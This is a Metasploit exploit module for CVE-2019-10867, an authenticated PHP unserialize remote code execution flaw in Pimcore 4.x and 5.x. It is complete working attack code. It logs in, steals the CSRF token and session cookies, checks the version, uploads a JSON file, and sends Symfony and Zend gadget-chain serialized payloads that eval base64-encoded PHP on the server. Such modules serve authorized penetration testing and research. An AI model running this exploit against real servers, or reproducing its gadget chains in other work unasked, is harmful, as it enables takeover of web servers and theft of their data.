# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = NormalRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::FileDropper

  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039; => "Pimcore Unserialize RCE",
      &#039;Description&#039; => %q(
        This module exploits a PHP unserialize() in Pimcore before 5.7.1 to
        execute arbitrary code. An authenticated user with "classes" permission
        could exploit the vulnerability.

        The vulnerability exists in the "ClassController.php" class, where the
        "bulk-commit" method makes it possible to exploit the unserialize function
        when passing untrusted values in "data" parameter.

        Tested on Pimcore 5.4.0-5.4.4, 5.5.1-5.5.4, 5.6.0-5.6.6 with the Symfony
        unserialize payload.

        Tested on Pimcore 4.0.0-4.6.5 with the Zend unserialize payload.
      ),
      &#039;License&#039; => MSF_LICENSE,
      &#039;Author&#039; =>
        [
          &#039;Daniele Scanu&#039;, # Discovery & PoC
          &#039;Fabio Cogno&#039; # Metasploit module
        ],
      &#039;References&#039; =>
        [
          [&#039;CVE&#039;, &#039;2019-10867&#039;],
          [&#039;URL&#039;, &#039;https://github.com/pimcore/pimcore/commit/38a29e2f4f5f060a73974626952501cee05fda73&#039;],
          [&#039;URL&#039;, &#039;https://snyk.io/vuln/SNYK-PHP-PIMCOREPIMCORE-173998&#039;]
        ],
      &#039;Platform&#039; => &#039;php&#039;,
      &#039;Arch&#039; => ARCH_PHP,
      &#039;Targets&#039; =>
        [
          [&#039;Pimcore 5.x (Symfony unserialize payload)&#039;, &#039;type&#039; => :symfony],
          [&#039;Pimcore 4.x (Zend unserialize payload)&#039;, &#039;type&#039; => :zend]
        ],
      &#039;Payload&#039; => {
        &#039;Space&#039; => 8000,
        &#039;DisableNops&#039; => true
      },
      &#039;Privileged&#039; => false,
      &#039;DisclosureDate&#039; => "Mar 11 2019",
      &#039;DefaultTarget&#039; => 0))

    register_options(
      [
        OptString.new(&#039;TARGETURI&#039;, [true, "Base Pimcore directory path", &#039;/&#039;]),
        OptString.new(&#039;USERNAME&#039;, [true, "Username to authenticate with", &#039;&#039;]),
        OptString.new(&#039;PASSWORD&#039;, [false, "Password to authenticate with", &#039;&#039;])
      ]
    )
  end

  def login
    # Try to login
    res = send_request_cgi(
      &#039;method&#039; => &#039;POST&#039;,
      &#039;uri&#039; => normalize_uri(target_uri.path, &#039;admin&#039;, &#039;login&#039;, &#039;login&#039;),
      &#039;vars_post&#039; => {
        &#039;username&#039; => datastore[&#039;USERNAME&#039;],
        &#039;password&#039; => datastore[&#039;PASSWORD&#039;]
      }
    )

    unless res
      fail_with(Failure::Unreachable, &#039;Connection failed&#039;)
    end

    if res.code == 302 && res.headers[&#039;Location&#039;] =~ /\/admin\/\?_dc=/
      print_good("Authentication successful: #{datastore[&#039;USERNAME&#039;]}:#{datastore[&#039;PASSWORD&#039;]}")

      # Grabbing CSRF token and PHPSESSID cookie
      return grab_csrftoken(res)
    end

    if res.code == 302 && res.headers[&#039;Location&#039;] =~ /auth_failed=true/
      fail_with(Failure::NoAccess, &#039;Invalid credentials&#039;)
    end

    fail_with(Failure::NoAccess, &#039;Authentication was unsuccessful&#039;)
  end

  def grab_csrftoken(auth_res)
    uri = "#{target_uri.path}admin/?_dc=#{auth_res.headers[&#039;Location&#039;].scan(/\/admin\/\?_dc=([0-9]+)/).flatten.first}"

    res = send_request_cgi(
      &#039;method&#039; => &#039;GET&#039;,
      &#039;uri&#039; => normalize_uri(uri),
      &#039;cookie&#039; => auth_res.get_cookies
    )

    if res && res.code == 200
      # Pimcore 5.x
      unless res.body.scan(/"csrfToken": "[a-z0-9]+",/).empty?
        @csrf_token = res.body.scan(/"csrfToken": "([a-z0-9]+)",/).flatten.first.to_s
        @pimcore_cookies = res.get_cookies.scan(/(PHPSESSID=[a-z0-9]+;)/).flatten[0]
        fail_with(Failure::NotFound, &#039;Failed to retrieve cookies&#039;) unless @pimcore_cookies
        @pimcore_cookies << " pimcore_admin_sid=1;"

        # Version
        version = res.body.scan(/"pimcore platform \(v([0-9]{1}\.[0-9]{1}\.[0-9]{1})\|([a-z0-9]+)\)"/i).flatten[0]
        build = res.body.scan(/"pimcore platform \(v([0-9]{1}\.[0-9]{1}\.[0-9]{1})\|([a-z0-9]+)\)"/i).flatten[1]
        fail_with(Failure::NotFound, &#039;Failed to retrieve the version and build&#039;) unless version && build
        print_version(version, build)
        return assign_target(version)
      end

      # Pimcore 4.x
      unless res.body.scan(/csrfToken: "[a-z0-9]+",/).empty?
        @csrf_token = res.body.scan(/csrfToken: "([a-z0-9]+)",/).flatten.first.to_s
        @pimcore_cookies = res.get_cookies.scan(/(pimcore_admin_sid=[a-z0-9]+;)/).flatten[0]
        fail_with(Failure::NotFound, &#039;Unable to retrieve cookies&#039;) unless @pimcore_cookies

        # Version
        version = res.body.scan(/version: "([0-9]{1}\.[0-9]{1}\.[0-9]{1})",/i).flatten[0]
        build = res.body.scan(/build: "([0-9]+)",/i).flatten[0]
        fail_with(Failure::NotFound, &#039;Failed to retrieve the version and build&#039;) unless version && build
        print_version(version, build)
        return assign_target(version)
      end

      # Version different from 4.x or 5.x
      return nil
    else
      fail_with(Failure::NoAccess, &#039;Failed to grab csrfToken and PHPSESSID&#039;)
    end
  end

  def print_version(version, build)
    print_status("Pimcore version: #{version}")
    print_status("Pimcore build: #{build}")
  end

  def assign_target(version)
    if Gem::Version.new(version) >= Gem::Version.new(&#039;5.0.0&#039;) && Gem::Version.new(version) <= Gem::Version.new(&#039;5.6.6&#039;)
      print_good("The target is vulnerable!")
      return targets[0]
    elsif Gem::Version.new(version) >= Gem::Version.new(&#039;4.0.0&#039;) && Gem::Version.new(version) <= Gem::Version.new(&#039;4.6.5&#039;)
      print_good("The target is vulnerable!")
      return targets[1]
    else
      print_error("The target is NOT vulnerable!")
      return nil
    end
  end

  def upload
    # JSON file payload
    fpayload = "{\"customlayout\":[{\"creationDate\": \"#{rand(1..9)}\", \"modificationDate\": \"#{rand(1..9)}\", \"userOwner\": \"#{rand(1..9)}\", \"userModification\": \"#{rand(1..9)}\"}]}"
    # construct POST data
    data = Rex::MIME::Message.new
    data.add_part(fpayload, &#039;application/json&#039;, nil, "form-data; name=\"Filedata\"; filename=\"#{rand_text_alphanumeric(3..9)}.json\"")

    # send JSON file payload to bulk-import function
    res = send_request_cgi(
      &#039;method&#039; => &#039;POST&#039;,
      &#039;uri&#039; => normalize_uri(target_uri.path, &#039;admin&#039;, &#039;class&#039;, &#039;bulk-import&#039;),
      &#039;vars_get&#039; => { &#039;csrfToken&#039; => @csrf_token },
      &#039;cookie&#039; => @pimcore_cookies,
      &#039;ctype&#039; => "multipart/form-data; boundary=#{data.bound}",
      &#039;data&#039; => data.to_s
    )

    unless res
      fail_with(Failure::Unreachable, &#039;Connection failed&#039;)
    end

    if res.code == 200
      json = res.get_json_document
      if json[&#039;success&#039;] == true
        print_good("JSON payload uploaded successfully: #{json[&#039;filename&#039;]}")
        return json[&#039;filename&#039;]
      else
        print_warning(&#039;Could not determine JSON payload file upload&#039;)
        return nil
      end
    end
  end

  def check
    res = send_request_cgi(
      &#039;method&#039; => &#039;GET&#039;,
      &#039;uri&#039; => normalize_uri(target_uri.path, &#039;admin&#039;, &#039;login&#039;)
    )

    unless res
      return Exploit::CheckCode::Unknown
    end

    if res.code == 200 && res.headers =~ /pimcore/i || res.body =~ /pimcore/i
      return Exploit::CheckCode::Detected
    end

    return Exploit::CheckCode::Unknown
  end

  def exploit
    # Try to log in, grab csrfToken and select target
    my_target = login
    if my_target.nil?
      fail_with(Failure::NotVulnerable, &#039;Target is not vulnerable.&#039;)
    end

    # Try to upload JSON payload file
    fname = upload

    unless fname.nil?
      # Register uploaded JSON payload file for cleanup
      register_files_for_cleanup(fname)
    end

    print_status("Selected payload: #{my_target.name}")

    case my_target[&#039;type&#039;]
    when :symfony
      # The payload to execute
      spayload = "php -r &#039;eval(base64_decode(\"#{Rex::Text.encode_base64(payload.encoded)}\"));&#039;"

      # The Symfony object payload
      serialize = "O:43:\"Symfony\\Component\\Cache\\Adapter\\ApcuAdapter\":3:{"
      serialize << "s:64:\"\x00Symfony\\Component\\Cache\\Adapter\\AbstractAdapter\x00mergeByLifetime\";"
      serialize << "s:9:\"proc_open\";"
      serialize << "s:58:\"\x00Symfony\\Component\\Cache\\Adapter\\AbstractAdapter\x00namespace\";a:0:{}"
      serialize << "s:57:\"\x00Symfony\\Component\\Cache\\Adapter\\AbstractAdapter\x00deferred\";"
      serialize << "s:#{spayload.length}:\"#{spayload}\";}"
    when :zend
      # The payload to execute
      spayload = "eval(base64_decode(&#039;#{Rex::Text.encode_base64(payload.encoded)}&#039;));"

      # The Zend1 object payload
      serialize = "a:2:{i:7;O:8:\"Zend_Log\":1:{s:11:\"\x00*\x00_writers\";a:1:{"
      serialize << "i:0;O:20:\"Zend_Log_Writer_Mail\":5:{s:16:\"\x00*\00_eventsToMail\";a:1:{"
      serialize << "i:0;i:1;}s:22:\"\x00*\x00_layoutEventsToMail\";a:0:{}s:8:\"\00*\x00_mail\";"
      serialize << "O:9:\"Zend_Mail\":0:{}s:10:\"\x00*\x00_layout\";O:11:\"Zend_Layout\":3:{"
      serialize << "s:13:\"\x00*\x00_inflector\";O:23:\"Zend_Filter_PregReplace\":2:{"
      serialize << "s:16:\"\x00*\x00_matchPattern\";s:7:\"/(.*)/e\";s:15:\"\x00*\x00_replacement\";"
      serialize << "S:#{spayload.length}:\"#{spayload}\";}"
      serialize << "s:20:\"\x00*\x00_inflectorEnabled\";b:1;s:10:\"\x00*\x00_layout\";"
      serialize << "s:6:\"layout\";}s:22:\"\x00*\x00_subjectPrependText\";N;}}};i:7;i:7;}"
    end

    # send serialized payload
    send_request_cgi(
      {
        &#039;method&#039; => &#039;POST&#039;,
        &#039;uri&#039; => normalize_uri(target_uri, &#039;admin&#039;, &#039;class&#039;, &#039;bulk-commit&#039;),
        &#039;ctype&#039; => &#039;application/x-www-form-urlencoded; charset=UTF-8&#039;,
        &#039;cookie&#039; => @pimcore_cookies,
        &#039;vars_post&#039; => {
          &#039;filename&#039; => fname,
          &#039;data&#039; => JSON.generate(
            &#039;type&#039; => &#039;customlayout&#039;,
            &#039;name&#039; => serialize
          )
        },
        &#039;headers&#039; => {
          &#039;X-pimcore-csrf-token&#039; => @csrf_token
        }
      }, 30
    )
  end
end

